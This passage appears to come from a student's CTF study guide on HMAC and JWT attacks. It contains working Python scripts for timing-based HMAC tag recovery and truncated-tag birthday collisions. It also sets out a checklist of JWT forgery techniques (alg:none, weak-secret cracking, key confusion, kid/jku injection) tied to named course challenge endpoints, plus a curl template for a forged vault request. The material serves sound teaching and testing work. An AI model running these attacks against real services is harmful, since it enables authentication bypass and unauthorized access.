    return True
```

**Fix:**
```python
import hmac
if hmac.compare_digest(expected_hmac, provided_hmac):
    return True
```

### 11.2 Detection

```python
import requests
import time

def detect_timing_leak(url: str, valid_sig_byte: str = "0") -> bool:
    """
    Submit signatures with varying prefix-matching bytes.
    If one takes significantly longer, timing leak exists.
    """
    results = {}
    for b in "0123456789abcdef":
        sig = b * 64   # 32-byte hex
        times = []
        for _ in range(20):
            t0 = time.perf_counter()
            requests.post(url, headers={"X-Signature": sig})
            times.append(time.perf_counter() - t0)
        results[b] = sum(times) / len(times)
    print("Timings:", {k: f"{v*1000:.2f}ms" for k, v in results.items()})
    # If one byte is consistently 5-20% slower → timing leak
    return max(results.values()) > min(results.values()) * 1.1
```

### 11.3 Full attack (byte-by-byte recovery)

```python
import time
import requests

def timing_attack_hmac(url: str, header_name: str = "X-Signature",
                        known_prefix: str = "", hex_chars: str = "0123456789abcdef",
                        samples: int = 50) -> str:
    """
    Recover HMAC tag byte-by-byte via timing.
    Very rare — but possible if server uses `==`.
    """
    recovered = known_prefix
    while len(recovered) < 64:
        best = None
        for c in hex_chars:
            trial = recovered + c
            times = []
            for _ in range(samples):
                t0 = time.perf_counter()
                requests.post(url, headers={header_name: trial})
                times.append(time.perf_counter() - t0)
            avg = sum(times) / len(times)
            if best is None or avg > best[1]:
                best = (c, avg)
        recovered += best[0]
        print(f"[+] Recovered: {recovered} ({best[1]*1000:.2f}ms)")
    return recovered
```

### 11.4 When to use

- **Very rare** — most libraries use `hmac.compare_digest`.
- **Only if you suspect** the server does `if expected == provided`.

---

## 12. Attack 9 — Truncated HMAC (birthday)

### 12.1 Description

If server truncates the HMAC to `N` bytes:
```python
tag = hmac_sha256(key, msg)[:4]   # first 4 bytes = 32 bits
```

Then **birthday attack**: `2^16` messages → collision.

### 12.2 Full script

```python
import hmac
import hashlib
import os

def find_hmac_collision(key: bytes, msg_prefix: bytes = b"",
                         trunc_bytes: int = 4) -> tuple[bytes, bytes, bytes]:
    """Find two messages with same truncated HMAC."""
    seen = {}
    for i in range(1 << 30):
        msg = msg_prefix + os.urandom(8)
        tag = hmac.new(key, msg, hashlib.sha256).digest()[:trunc_bytes]
        if tag in seen and seen[tag] != msg:
            return seen[tag], msg, tag
        seen[tag] = msg
    return None

# Example: 4-byte truncation, ~65536 tries → seconds
a, b, tag = find_hmac_collision(b"secret", trunc_bytes=4)
print(f"[+] Collision: {tag.hex()}")
print(f"    msg1: {a.hex()}")
print(f"    msg2: {b.hex()}")
```

### 12.3 When to use

- Server uses `tag[:N]` or `tag.int.to_bytes(...)`.
- **Rare in CTF** — but if the task says "fingerprint" or "short tag".

---

## 13. Attack 10 — MAC-then-encrypt (theoretical)

### 13.1 Description

From the **slides** (Message Authentication section):

| Order | Security | Used by |
|---|---|---|
| **H → E** (hash then encrypt) | ❌ (WEP broken) | WEP |
| **A → E** (MAC then encrypt) | ⚠️ (padding oracle) | SSL/TLS 1.0 |
| **E → A** (encrypt then MAC) | ✅ (correct) | IPSec |
| **E + A** (encrypt AND MAC) | ✅ (correct) | SSH |

**MAC-then-encrypt** = `E(K2, M || MAC(K1, M))` — vulnerable to **padding oracle** on the **encryption** step, because the MAC is inside the ciphertext.

### 13.2 Padding oracle attack (with HMAC)

Same as AES-CBC padding oracle, **but** the server returns distinct errors:
- "padding error" vs "MAC error"

If the server checks **padding first**, then **MAC**, you can:
1. **Decrypt** any ciphertext byte-by-byte (via padding oracle).
2. **Re-encrypt** with a valid MAC — but only if you can forge MAC (you can't).
3. **So MAC-then-encrypt's padding oracle is limited** — you can leak **plaintext** but not **forge signatures**.

**Full padding oracle attack:** see AES §11 (CBC padding oracle).

### 13.3 When to use

- **Rare in CTF** — but if a task combines AES-CBC + HMAC, check the order.
- **Not in your session tasks.**

---

## 14. HMAC in session tasks — full mapping

### 14.1 Signed, Sealed, Misinterpreted

| Aspect | Detail |
|---|---|
| **Endpoint** | `http://cns-test.idlab.uantwerpen.be:50007` |
| **Auth** | HMAC-SHA256 over JSON |
| **Signature header** | `X-Signature` |
| **Challenge** | `GET /challenge` → payment + signature |
| **Target** | `POST /vault` → admin vault |
| **Hint** | "You may reuse the signature" |
| **Attack** | §5 (canonicalization bypass) |
| **Script** | `solve_signed_sealed.py` (§5.3) |

**Debug strategy at the session:**

1. Run `solve_signed_sealed.py`.
2. If none of the 10 approaches work, **read server responses** for hints.
3. **Try manually** with `curl`:
   ```bash
   curl -X POST http://.../vault \
     -H "X-Signature: $SIG" \
     -H "Content-Type: application/json" \
     --data '{"reference":"pwn",...}'
   ```
4. If server returns **parsed payment** in error → confirms what it read.
5. If server returns **canonical form** in error → confirms what it verified.
6. **Diff** the two → that's the attack.

### 14.2 Token of Trust

| Aspect | Detail |
|---|---|
| **Endpoint** | `http://cns-test.idlab.uantwerpen.be:50009` |
| **Auth** | JWT (likely HS256) |
| **Login** | `POST /login` (guest/guest) |
| **Target** | `GET /admin` |
| **Hint** | "Decode the JWT parts; walk into /admin as admin" |
| **Attacks** | §6 (alg:none), §7 (weak secret), §8 (confusion), §9 (kid) |
| **Scripts** | `solve_jwt_alg_none.py`, `solve_jwt_weak_secret.py` |

**Debug strategy at the session:**

1. **Login** → decode JWT → inspect header/payload.
2. **Try `alg:none`** first (§6) — fastest to test, ~30 variants.
3. **Try weak secret** (§7) with `rockyou.txt` — ~30 s.
4. **Try hashcat** (`-m 16500`) if Python too slow — **10,000× faster**.
5. **Try algorithm confusion** (§8) if public key is exposed.
6. **Try `kid` injection** (§9) if header has `kid`.
7. **Try `jku` injection** (§10) if header has `jku`/`x5u`.

### 14.3 Other session tasks

| Task | HMAC-related? |
|---|---|
| **Secure Bank** | ❌ Salsa20 (no HMAC) |
| **Secure Bank 2** | ❌ SHA-256 truncated (not HMAC) |
| **Noncense** | ❌ AES-CTR (no HMAC) |
| **Security Cam** | ❌ MD5 Digest (RTSP) |
| **Better Hash** | ❌ Custom hash |
| **Key standardisation** | ❌ DES |
| **Replanting** | ❌ LCG |
| **Dutch Exclusivity** | ❌ XOR |
| **AES 2 demo** | ❌ AES MITM |

**Only two tasks use HMAC.**

---

## 15. Quick reference: "I see HMAC — what do I do?"

| Situation | Attack | Script |
|---|---|---|
| Have `HMAC(password)` | Dictionary | §4 |
| HMAC over JSON | **Canonicalization bypass** | §5 |
| HMAC in JWT | **alg:none / weak secret / confusion / kid** | §6–§10 |
| Server leaks timing | Timing attack | §11 |
| Truncated HMAC | Birthday | §12 |
| MAC-then-encrypt + padding | Padding oracle | §13 |
| **`H(secret \|\| msg)` (not HMAC)** | **Length extension** | **(SHA-2 §6)** |
| **HMAC-SHA256** | Length extension **impossible** | §2 |

---

## 16. HMAC vs "HMAC" — the critical distinction

Many challenges **claim** HMAC but use the **wrong construction**:

```python
# BAD: length extension works
tag = hashlib.sha256(SECRET + message).hexdigest()

# GOOD: length extension blocked
import hmac
tag = hmac.new(SECRET, message, hashlib.sha256).hexdigest()
```

**How to tell them apart:**
- Read the code: `hashlib.sha256(SECRET + message)` → **vulnerable** (SHA-2 length extension).
- Read the code: `hmac.new(SECRET, message, hashlib.sha256)` → **safe** (length extension blocked).
- Cannot tell from the **tag itself** (same length) — must see how it's computed.

**If in doubt:** try **both** length extension (§SHA-2 6) and **weak key** (§4 here).
